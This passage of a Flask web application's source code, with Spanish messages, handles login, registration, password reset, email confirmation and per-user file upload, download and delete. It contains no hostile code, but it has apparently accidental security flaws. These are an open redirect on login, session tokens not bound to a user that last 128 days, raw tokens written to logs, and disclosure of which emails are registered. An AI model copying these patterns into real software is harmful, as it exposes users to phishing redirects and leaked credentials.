import os
import re
import bcrypt
import signal
import traceback
import requests
import jwt
import datetime
import time
import sys
import json
import logging
import Modules.LOGGER

from Modules import USERPG
from Modules import BLOGPG
from Modules import CONFIG
from dotenv import load_dotenv
from Modules.SENDMAIL import SEND_MAIL

from werkzeug.utils import secure_filename
from flask_socketio import SocketIO, emit, send
from flask import (Flask, request, render_template, redirect, url_for, jsonify,
    Response, flash, session, send_file, send_from_directory, make_response,
)
#from flask_cors import CORS, cross_origin




app = Flask(__name__, template_folder="web")
app.secret_key = CONFIG.SECRECT
app.config["UPLOAD_FOLDER"] = CONFIG.RUTE
log = logging.getLogger("WEB")
load_dotenv("config.env")
EMAIL_WEBMASTER = os.getenv("EMAIL_WEBMASTER")

VERSION = "v0.91.3b"
START_SERVER_TIME = time.time()
log.info(f"SERVIDOR INICIADO EN: [{CONFIG.MY_OS}] [{VERSION}]")
USERPG.CONNECTION_TEST()


######################## WEB ########################


@app.route("/")
def index():
    ip_client = request.headers.get("X-Real-IP")
    dark_mode = request.cookies.get('dark-mode', 'true')
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False

        posts = BLOGPG.GET_BL('all')       
        posts.sort(key=lambda x: x['id'], reverse=True) 
        recent = posts[:4]
        if sessions == False:
            log.debug(f"[{ip_client}] [/ ] No hay usuario en sesion")
            return render_template("index.html", recent=recent, cookie=dark_mode, version=VERSION)
        else:
            try:
                verific = jwt.decode(jwt=str(token), key=str(app.config.get("SECRET_KEY")), algorithms=["HS256"])
                log.info(f"[{ip_client}] [/ ] Token valido [{uss}]")
                return render_template("app/index.html", recent=recent, user=uss, cookie=dark_mode, version=VERSION)
            except jwt.ExpiredSignatureError:
                log.debug(f"[{ip_client}] [/ ] Token expirado")
                return redirect(url_for("login"))
            except jwt.InvalidTokenError:
                log.debug(f"[{ip_client}] [/ ] Token invalido")
                return redirect(url_for("login"))
    except Exception as e:
        log.error(f"[{ip_client}] [/ ] ERROR[0001]: {e} [{traceback.format_exc()}]")
        return render_template("index.html", cookie=dark_mode, version=VERSION)


@app.route("/login", methods=["POST", "GET"])
def login():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            email = request.form.get("email")
            passw = request.form.get("passw")
            redirect_for = request.form.get("redirect_for")
            checkbox = request.form.get("remember-me")
            re_mail = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
            if re.match(re_mail, email):
                TheUser = USERPG.GET_USER("email", email)
            else:
                TheUser = USERPG.GET_USER("username", email)
            if TheUser == None:
                flash("Usuario o contraseña  incorrecta, si no recuerda su contraseña click", "warning")
                return render_template("auth/log-in_layout.html")
            elif bcrypt.checkpw(passw.encode("utf-8"), TheUser['passw'].encode("utf-8")) == False:
                flash("Usuario o contraseña incorrecta, si no recuerda su contraseña click", "warning")
                return render_template("auth/log-in_layout.html")
            else:
                data_token = {"exp": datetime.datetime.now(datetime.UTC)+ datetime.timedelta(days=128, minutes=0, seconds=0),"iat": datetime.datetime.now(datetime.UTC)}
                thetoken = jwt.encode(data_token, app.config.get("SECRET_KEY"), algorithm="HS256")
                if checkbox != None:
                    session.permanent = True
                session["user"] = TheUser['id']
                session["token"] = thetoken
                if TheUser['email_confirm'] != "true":
                    return redirect(url_for("EmailSend", email=TheUser['email']))
                flash("Cuenta iniciada correctamente","success")
                log.info(f"[{ip_client}] [/login ] Usuario [{TheUser['username']}] logueado correctamente")
                if redirect_for != '':
                    return redirect(redirect_for)
                return redirect(url_for("index"))             
        except Exception as e:
            flash("Ups algo salio mal, intentalo de nuevo", "error")
            log.error(f"[{ip_client}] [/login ] ERROR[0002]: {e} [{traceback.format_exc()}]")
            return render_template("auth/log-in_layout.html")
    else:
        log.debug(f"[{ip_client}] [/login ] [metodo GET]")
        if request.args.get("redirect") != None:
            redirect_for = request.args.get("redirect")
            return render_template("auth/log-in_layout.html", redirect_for=redirect_for)
        return render_template("auth/log-in_layout.html")


@app.route("/regist", methods=["POST", "GET"])
def regist():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            username = request.form.get("username")
            email = request.form.get("email")
            passw = request.form.get("passw")
            re_mail = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
            if re.match(re_mail,username):
                flash("El usuario no puede ser un correo", "error")
                log.debug(f"[{ip_client}] [/regist ] Usuario [El usuario no puede ser un correo]")
                return render_template("auth/sign-up_layout.html")
            elif passw.__len__() < 8:
                flash("La contraseña no puede tener menos de 8 dijitos", "error")
                log.debug(f"[{ip_client}] [/regist ] Contraseña incorrecta [menor a 8 dijitos]")
                return render_template("auth/sign-up_layout.html")
            elif re.match(re_mail, email):
                EPASSW = bcrypt.hashpw(passw.encode('utf-8'), bcrypt.gensalt())
                response = USERPG.INSERT_USER(username, email, EPASSW.decode('utf-8'))
                if response == f"Usuaro {username} creado correctamente":
                    TheUser = USERPG.GET_USER("username", username)
                    data_token = {"exp": datetime.datetime.now(datetime.UTC)+ datetime.timedelta(days=128, minutes=0, seconds=0),"iat": datetime.datetime.now(datetime.UTC)}
                    thetoken = jwt.encode(data_token, app.config.get("SECRET_KEY"), algorithm="HS256")
                    session.permanent = True
                    session["user"] = TheUser['id']
                    session["token"] = thetoken
                    flash(response, "info")
                    log.info(f"[{ip_client}] [/regist ] Usuario {username} creado correctamente")
                    return redirect(url_for("EmailSend", email=email))
                else:
                    flash(response, "warning")
                    log.debug(f"[{ip_client}] [/regist ] Usuario {username} no creado [{response}]")
                    return render_template("auth/sign-up_layout.html")
            else:
                flash("El correo electronico no es valido", "error")
                log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [correo]")
                return render_template("auth/sign-up_layout.html")
        except Exception as e:
            flash("Ups algo salio mal, intentalo de nuevo", "error")
            log.error(f"[{ip_client}] [/regist ] ERROR[0003]: {e} [{traceback.format_exc()}]")
            return render_template("auth/sign-up_layout.html")
    else:
        log.debug(f"[{ip_client}] [/regist ] [metodo GET]")
        return render_template("auth/sign-up_layout.html")


@app.route("/logout", methods=["POST", "GET"])
def logout():
    ip_client = request.headers.get("X-Real-IP")
    user = session["user"]
    log.info(f"[{ip_client}] [/logout ] Usuario [{user}] cerrando sesion")
    session.pop("user", None)
    session.pop("token", None)
    return redirect(url_for("index"))


@app.route("/resetpassw", methods=["POST", "GET"])
def resetpassw():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            password = request.form.get("passw")
            password2 = request.form.get("passw2")
            token = request.form.get("token")
            try:
                verific = jwt.decode(jwt=str(token), key=str(app.config.get("SECRET_KEY")), algorithms=["HS256"])
                user = USERPG.GET_USER("username", verific['user'])
                if int(user['random']) == int(verific['code']):
                    if password.__len__() < 8:
                        flash("La contraseña no puede tener menos de 8 dijitos", "error")
                        log.debug(f"[{ip_client}] [/resetpassw ] Contraseña incorrecta [menor a 8 dijitos]")
                        return render_template("auth/RPassw.html", token=token, user=user['username'])
                    elif password != password2:
                        flash("Las contraseñas no coinciden", "error")
                        log.debug(f"[{ip_client}] [/resetpassw ] Contraseña incorrecta [no coinciden]")
                        return render_template("auth/RPassw.html", token=token, user=user['username'])
                    EPASSW = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
                    USERPG.EDITAR('passw',user['username'], EPASSW.decode('utf-8'))
                    USERPG.C_EMAIL_VAL(user['username'])
                    flash("Contraseña actualizada correctamente", "success")
                    log.info(f"[{ip_client}] [/resetpassw ] Usuario [{user['username']}] cambio su contraseña")
                    return redirect(url_for("login"))
                else:
                    flash("Autorizacion invalida", "error")
                    log.debug(f"[{ip_client}] [/resetpassw ] Usuario [{user['username']}] ")
                    return redirect(url_for("resetpassw"))
            except jwt.ExpiredSignatureError:
                flash("Token expirado", "error")
                log.debug(f"[{ip_client}] [/resetpassw ] Token expirado")
                return redirect(url_for("resetpassw"))
            except jwt.InvalidTokenError:
                flash("Token invalido", "error")
                log.debug(f"[{ip_client}] [/resetpassw ] Token invalido")
                return render_template("auth/RCPassw.html")
        except Exception as e:
            flash("Ups algo salio mal, intentalo de nuevo mas tarde", "error")
            log.error(f"[{ip_client}] [/resetpassw ] ERROR[0004]: {e} [{traceback.format_exc()}]")
            return render_template("auth/RCPassw.html")
    if request.args.get("token"):
        token = request.args.get("token")
        try:
            verific = jwt.decode(jwt=str(token), key=str(app.config.get("SECRET_KEY")), algorithms=["HS256"])
            user = USERPG.GET_USER("username", verific['user'])
            if int(user['random']) == int(verific['code']):
                log.info(f"[{ip_client}] [/resetpassw ] Token valido [{verific['user']}]")
                return render_template("auth/RPassw.html", token=token, user=verific['user'])
            else:
                flash("Autorizacion invalida", "error")
                log.debug(f"[{ip_client}] [/resetpassw ] Usuario [{user['username']}] ")
                return render_template("auth/RCPassw.html")
        except jwt.ExpiredSignatureError:
            flash("Token expirado", "error")
            log.debug(f"[{ip_client}] [/resetpassw ] Token expirado")
            return redirect(url_for("resetpassw"))
        except jwt.InvalidTokenError:
            flash("Token invalido", "error")
            log.debug(f"[{ip_client}] [/resetpassw ] Token invalido")
            return render_template("auth/RCPassw.html")
    if request.args.get("email"):
        email = request.args.get("email")
        try:
            user = USERPG.GET_USER("email", email)
            if user == None:
                flash(f'No se a registrado una cuenta con el correo electronico "{email}" en nuestros servidores, si no tiene una cuenta creela', 'warning')
                log.info(f"[{ip_client}] [/EmailSend ] Correo [{email}] no existe")
                return render_template("auth/REPassw.html")
            code = USERPG.C_EMAIL_VAL(user['username'])
            datos_send_token = {"user": user['username'], "code": code, "exp": datetime.datetime.now(datetime.UTC)+ datetime.timedelta(minutes=30, seconds=0),"iat": datetime.datetime.now(datetime.UTC)}
            token = jwt.encode(datos_send_token, app.config.get("SECRET_KEY"), algorithm="HS256")

            subject = f"Recuperecion de cuenta"
            message = f"""
            <html>
                <head>
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            background-color: #f4f4f4;
                            margin: 0;
                            padding: 0;
                            color: #333;
                            text-align: center;
                        }}
                        .container {{
                            max-width: 600px;
                            width: 90%;
                            margin: 0 auto;
                            background-color: #fff;
                            padding: 15px;
                            border-radius: 8px;
                            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                            text-align: center;
                        }}
                        h1 {{
                            color: #6c55f9;
                            font-size: 22px;
                            margin-bottom: 20px;
                        }}
                        h2 {{
                            color: #333;
                            font-size: 16px;
                            margin-bottom: 20px;
                            line-height: 1.5;
                        }}
                        p {{
                            color: #555;
                            font-size: 14px;
                            line-height: 1.5;
                            margin-top: 20px;
                        }}
                        a {{
                            color: #6c55f9;
                            text-decoration: none;
                            font-weight: bold;
                        }}
                        .code {{
                            font-size: 20px;
                            color: #6c55f9;
                            background-color: #f4f4f4;
                            padding: 10px;
                            border-radius: 5px;
                            border: 1px solid #6c55f9;
                            display: inline-block;
                            margin-top: 20px;
                            user-select: text; 
                        }}
                        .footer {{
                            margin-top: 30px;
                            font-size: 12px;
                            color: #777;
                        }}
                        @media (max-width: 600px) {{
                            h1 {{font-size: 20px;}}
                            h2 {{font-size: 14px;}}
                            .code {{
                                font-size: 18px;
                                padding: 8px;
                            }}
                        }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Recuperacion de cuenta</h1>
                        <h2>Hola <strong>{user['username']}</strong>,</h2>
                        <h2>Por favor haz clic en el enlace a continuación para cambiar tu contraseña</h2>
                        <h1><a href="https://xxacrvxx.ydns.eu/resetpassw?token={token}">Cambiar contraseña</a></h1>
                        <p>Este enlace será válido durante 30 minutos. Si no solicitaste esto, ignora este correo.</p>
                        <div class="footer">
                            <p>Saludos,<br>El equipo de xXACRVXx</p>
                        </div>
                    </div>
                </body>
            </html>
            """

            SEND_MAIL(email, subject, message)
            flash(f"Se envio un correo a [{email}] para recuperar su cuenta, por favor haga click en el enlace de el correo", 'info')
            log.info(f"[{ip_client}] [/EmailSend ] Usuario [{user['username']}] envio correo a [{email}] para confirmar su cuenta")
            return render_template("auth/RCPassw.html", email=email)
        except Exception as e:
            log.error(f"[{ip_client}] [/EmailSend ] ERROR[0004]: {e} [{traceback.format_exc()}]")
            flash(f"Ups estamos teniendo problemas para enviar el correo, por favor intentelo mas tarde", 'error')
            return render_template("auth/RCPassw.html")
    else:
        return render_template("auth/REPassw.html")


@app.route("/confirm")
def EmailSend():
    ip_client = request.headers.get("X-Real-IP")
    if request.args.get("email"):
        email = request.args.get("email")
        try:
            user = USERPG.GET_USER("email", email)
            if user == None:
                flash(f'No se a registrado una cuenta con el correo electronico "{email}" en nuestros servidores, si no tiene una cuenta creela', 'warning')
                log.info(f"[{ip_client}] [/EmailSend ] Correo [{email}] no existe")
                return render_template("auth/EmailSend.html")
            code = USERPG.C_EMAIL_VAL(user['username'], VERIFIC=True)
            if code == True:
                flash(f'El correo "{email}" ya fue confirmado anteriormente', 'error')
                log.info(f"[{ip_client}] [/EmailSend ] Correo [{email}] ya fue confirmado anteriormente")
                return render_template("auth/EmailSend.html")

            datos_send_token = {"user": user['username'], "email": email, "code": code}
            token = jwt.encode(datos_send_token, app.config.get("SECRET_KEY"), algorithm="HS256")

            subject = f"Confirmación de cuenta [{code}]"
            message = f"""
            <html>
                <head>
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            background-color: #f4f4f4;
                            margin: 0;
                            padding: 0;
                            color: #333;
                            text-align: center;
                        }}
                        .container {{
                            max-width: 600px;
                            width: 90%;
                            margin: 0 auto;
                            background-color: #fff;
                            padding: 15px;
                            border-radius: 8px;
                            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                            text-align: center;
                        }}
                        h1 {{
                            color: #6c55f9;
                            font-size: 22px;
                            margin-bottom: 20px;
                        }}
                        h2 {{
                            color: #333;
                            font-size: 16px;
                            margin-bottom: 20px;
                            line-height: 1.5;
                        }}
                        p {{
                            color: #555;
                            font-size: 14px;
                            line-height: 1.5;
                            margin-top: 20px;
                        }}
                        a {{
                            color: #6c55f9;
                            text-decoration: none;
                            font-weight: bold;
                        }}
                        .code {{
                            font-size: 20px;
                            color: #6c55f9;
                            background-color: #f4f4f4;
                            padding: 10px;
                            border-radius: 5px;
                            border: 1px solid #6c55f9;
                            display: inline-block;
                            margin-top: 20px;
                            user-select: text; 
                        }}
                        .footer {{
                            margin-top: 30px;
                            font-size: 12px;
                            color: #777;
                        }}
                        @media (max-width: 600px) {{
                            h1 {{font-size: 20px;}}
                            h2 {{font-size: 14px;}}
                            .code {{
                                font-size: 18px;
                                padding: 8px;
                            }}
                        }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Confirmación de cuenta</h1>
                        <h2>Hola <strong>{user['username']}</strong>,</h2>
                        <h2>¡Gracias por registrarte en nuestra plataforma! Por favor, confirma tu correo electrónico copiando y pegando el siguiente código:</h2>
                        <div class="code">{code}</div>
                        <h2>O haz clic en el enlace a continuación para confirmar directamente:</h2>
                        <h1><a href="https://xxacrvxx.ydns.eu/EmailConfirm?token={token}">Confirmar mi cuenta</a></h1>
                        <p>Este código será válido durante 30 minutos. Si no solicitaste este registro, ignora este correo.</p>
                        <div class="footer">
                            <p>Saludos,<br>El equipo de xXACRVXx</p>
                        </div>
                    </div>
                </body>
            </html>
            """

            SEND_MAIL(email, subject, message)
            log.info(f"[{ip_client}] [/EmailSend ] Usuario [{user['username']}] envio correo a [{email}] para confirmar su cuenta")
            return redirect(url_for("EmailConfirm", email=email))
        except Exception as e:
            log.error(f"[{ip_client}] [/EmailSend ] ERROR[0004]: {e} [{traceback.format_exc()}]")
            flash(f"Ups estamos teniendo problemas para enviar el correo, por favor intentelo mas tarde", 'error')
            return render_template("auth/EmailSend.html")
    else:
        return render_template("auth/EmailSend.html")


@app.route("/EmailConfirm", methods=["POST", "GET"])
def EmailConfirm():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            email = request.form.get("email")
            code = request.form.get("code")
            response = USERPG.EMAIL_VAL(email, code, True)
            if response == True:
                log.info(
                    f"[{ip_client}] [/EmailConfirm ] Correo [{email}] a activado su cuenta")
                return redirect(url_for("index"))
            if response == False:
                flash(f"EL CODIGO DE ACTIVACION ES INCORRECTO, SI NO A RESIVIDO UN CORREO PUEDE VOLVER A INTENTARLO", 'warning')
                log.debug(
                    f"[{ip_client}] [/EmailConfirm ] Correo [{email}] utilizo un codigo incorrecto")
                return render_template("auth/EmailConfirm.html")
        except Exception as e:
            log.error(
                f"[{ip_client}] [/EmailConfirm ] ERROR[0005]: {e} [{traceback.format_exc()}]")
            flash(f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde", 'error')
            return render_template("auth/EmailConfirm.html")
    else:
        try:
            if request.args.get("email"):
                email = request.args.get("email")
                log.debug(
                    f"[{ip_client}] [/EmailConfirm ] Usuario [{email}] solicito confirmacion de cuenta")
                return render_template("auth/EmailConfirm.html", correo=email)

            if request.args.get("token"):
                try:
                    token = request.args.get("token")
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"])

                    user = verific["user"]
                    email = verific["email"]
                    code = verific["code"]
                    user_data = USERPG.GET_USER("username", user)
                    if user_data == None:
                        log.warning(
                            f"[{ip_client}] [/EmailConfirm ] WARNING[0001] user [{user}], email [{email}] intento falsear el token")
                        return redirect(url_for("EmailSend"))

                    response = USERPG.EMAIL_VAL(email, code, True)
                    if response == True:
                        log.info(
                            f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data['username']}] cuenta activada")
                        return redirect(url_for("index"))
                    else:
                        log.debug(
                            f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data['username']}] codigo incorrecto")
                        return redirect(url_for("EmailSend"))

                except jwt.ExpiredSignatureError:
                    log.debug(
                        f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token expirado")
                    return redirect(url_for("EmailSend"))
                except jwt.InvalidTokenError:
                    log.debug(
                        f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token invalido")
                    return redirect(url_for("EmailSend"))
                except Exception as e:
                    log.error(
                        f"[{ip_client}] [/EmailConfirm ] ERROR[0006]: {e} [{traceback.format_exc()}]")
                    flash(f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde", 'error')
                    return render_template("auth/EmailConfirm.html")
            else:
                return redirect(url_for("EmailSend"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/EmailConfirm ] ERROR[0007]: {e} [{traceback.format_exc()}]")
            flash(f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde", 'error')
            return render_template("auth/EmailConfirm.html")


@app.route("/options")
def options():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            sessions = True
        except:
            uss = None
            sessions = False
        if sessions == True:
            return render_template("auth/Options.html", cookie=dark_mode)
        else:
            redirect(url_for("login"))
    except Exception as e:
        log.error(f"[{ip_client}] [/details ] ERROR[0013]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/cloud")
def cloud():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template("files/cloud.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("files/cloud.html", cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/cloud ] ERROR[0015]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/download")
def download():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    if request.args.get("file"):
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    archive = request.args.get("file")
                    the_path = os.path.join(app.config.get("UPLOAD_FOLDER"),str(uid))
                    log.info(
                        f"[{ip_client}] [/download ] Usuario [{uss}] descargando archivo [{archive}]"
                    )
                    if os.path.isfile(os.path.join(the_path, archive)) == False:
                        return Response(status=404)
                    return send_from_directory(the_path, archive, as_attachment=False)
                except jwt.ExpiredSignatureError:
                    log.debug(
                        f"[{ip_client}] [/download ] Usuario [{uss}] expirón token [{token}]")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(
                        f"[{ip_client}] [/download ] Usuario [{uss}] token invalido [{token}]")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.error(
                        f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                    return redirect(url_for("download"))

            else:
                log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
                return redirect(url_for("login"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/download ] ERROR[0008]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))

    elif request.args.get("token"):
        the_token = request.args.get("token")
        try:
            verific = jwt.decode(
                the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            archive = verific["archive"]
            user_token = str(verific["user"])
            the_path = os.path.join(app.config.get("UPLOAD_FOLDER") ,str(user_token))
            if os.path.isfile(os.path.join(the_path, archive)) == False:
                return Response(status=404)
            log.info(f"[{ip_client}] [/download ] Usuario descargando archivo [{archive}]")
            return send_from_directory(the_path, archive, as_attachment=False)
        except jwt.ExpiredSignatureError:
            log.debug(
                f"[{ip_client}] [/download ] Usuario  expirón token")
            return redirect(url_for("login"))
        except jwt.InvalidTokenError:
            log.debug(
                f"[{ip_client}] [/download ] Usuario  token invalido")
            return redirect(url_for("login"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/download ] Usuario  error {e} [{traceback.format_exc()}]")
            return redirect(url_for("download"))

    elif request.args.get("f_file"):
        the_token = request.args.get("f_file")
        try:
            verific = jwt.decode(
                the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            archive = verific["archive"]
            user_token = str(verific["user"])
            suid = USERPG.GET_USER("id", user_token)
            uss = suid['username']
            the_path = os.path.join(app.config.get("UPLOAD_FOLDER") , str(user_token))
            log.info(
                f"[{ip_client}] [/download ] Usuario [{uss}] descargando archivo [{archive}]"
            )
            if os.path.isfile(os.path.join(the_path, archive)) == False:
                return Response(status=404)
            return send_from_directory(the_path, archive, as_attachment=True)
        except jwt.ExpiredSignatureError:
            log.debug(
                f"[{ip_client}] [/download ] Usuario {uss} expirón token {token}")
            return redirect(url_for("login"))
        except jwt.InvalidTokenError:
            log.debug(
                f"[{ip_client}] [/download ] Usuario {uss} token invalido {token}")
            return redirect(url_for("login"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("download"))
    else:
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    dir = os.path.join(app.config.get("UPLOAD_FOLDER"),str(uid))
                    if os.path.isdir(dir) == False:
                        os.mkdir(dir)            
                    archives = os.listdir(dir)
                    file = []
                    S_KEY = app.config.get("SECRET_KEY")
                    USER_ENCRIPT = str(uid)
                    for archive in archives:
                        file_size = CONFIG.SPACE_FILE(str(uid), archive)
                        datos_send_token = {
                            "user": USER_ENCRIPT,
                            "archive": archive,
                        }
                        the_token = jwt.encode(
                            datos_send_token,
                            app.config.get("SECRET_KEY"),
                            algorithm="HS256",
                        )
                        file.append([archive, the_token, file_size])
                    sorted_file = sorted(file, key=lambda x: x[0])
                    
                    page = request.args.get('page', 1, type=int)
                    per_page = 15
                    total_posts = len(sorted_file)
                    total_pages = (total_posts + per_page - 1) // per_page  # Calcula el número total de páginas
                    start = (page - 1) * per_page
                    end = start + per_page
                    paginated_posts = sorted_file[start:end]
                    log.debug(f"[{ip_client}] [/download ] [method GET] Usuario {uss}")
                    return render_template(
                        "files/download.html",
                        user=uss,
                        url=dir,
                        files=paginated_posts,
                        space=CONFIG.Free_Space(),
                        page=page,
                        total_pages=total_pages,
                        cookie=dark_mode, version=VERSION
                    )

                except jwt.ExpiredSignatureError:
                    log.debug(
                        f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(
                        f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
                    return redirect(url_for("login"))

            else:
                log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
                return redirect(url_for("login" , redirect='download'))

        except Exception as e:
            log.error(
                f"[{ip_client}] [/download ] ERROR[0009]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))


@app.route("/upload", methods=["POST", "GET"])
def upload():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    if request.files["file"]:
                        file = request.files["file"]
                    else:
                        return redirect(url_for("upload"))
                    filename = secure_filename(file.filename)
                    DIR = os.path.join(app.config.get("UPLOAD_FOLDER"), str(uid))
                    if os.path.isdir(DIR) == False:
                        os.mkdir(DIR)
                    the_path = os.path.join(app.config.get("UPLOAD_FOLDER"), str(uid), filename)
                    file_path = the_path
                    file.save(file_path)
                    log.info(f"[{ip_client}] [/upload ] Usuario [{uss}] subión archivo [{filename}]")
                    return jsonify({"nombre": filename})
                except jwt.ExpiredSignatureError:
                    log.debug(
                        f"[{ip_client}] [/upload ] Usuario [{uss}]  expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(
                        f"[{ip_client}] [/upload ] Usuario [{uss}]  token invalido")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.error(
                        f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                    return redirect(url_for("login"))
            else:
                log.debug(
                    f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                return redirect(url_for("login"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/upload] ERROR[0010]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))
    else:
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    log.debug(
                        f"[{ip_client}] [/upload ] [method GET] Usuario {uss} logueado")
                    return render_template(
                        "files/upload.html", user=uss, space=CONFIG.Free_Space(), cookie=dark_mode, version=VERSION
                    )

                except jwt.ExpiredSignatureError:
                    log.debug(
                        f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(
                        f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] token invalido")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.warning(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] error {e}")
                    return redirect(url_for("login"))
            else:
                log.debug(
                    f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                return redirect(url_for("login"))
        except Exception as e:
            log.error(
                f"[{ip_client}] [/upload ] ERROR[0011]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))


@app.route("/delete")
def delete():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        if request.args.get("del_file"):
            try:
                the_token = request.args.get("del_file")
                verific = jwt.decode(the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"])
                archive = verific["archive"]
                user_token = str(verific["user"])
                suid = USERPG.GET_USER("id", user_token)
                uss = suid['username']
                the_path = os.path.join(app.config.get("UPLOAD_FOLDER"), user_token, archive)
                os.remove(the_path)
                log.info( f"[{ip_client}] [/delete ] Usuario [{uss}] borrón archivo [{archive}]")
                flash(f"{archive} borrado correctamente","success")
                return redirect(url_for("download"))
            except jwt.ExpiredSignatureError:
                log.debug(f"[{ip_client}] [/delete ] expiró el token")
                return redirect(url_for("login"), code=403)
            except jwt.InvalidTokenError:
                log.debug(
                    f"[{ip_client}] [/delete ] token invalido")
                return redirect(url_for("login"), code=403)
            except Exception as e:
                log.error(
                    f"[{ip_client}] [/delete ] error {e} [{traceback.format_exc()}]")
                return redirect(url_for("login"))
        else:
            log.debug(f"[{ip_client}] [/delete ] [method GET]")
            return redirect(url_for("download"))
    except Exception as e:
            log.error(f"[{ip_client}] [/delete ] ERROR[0012]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))


@app.route("/news")
@app.route("/blog/")
@app.route("/blog")
def blog():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if request.args.get('tags'):
            posts = BLOGPG.GET_BL('tags',request.args.get('tags'))
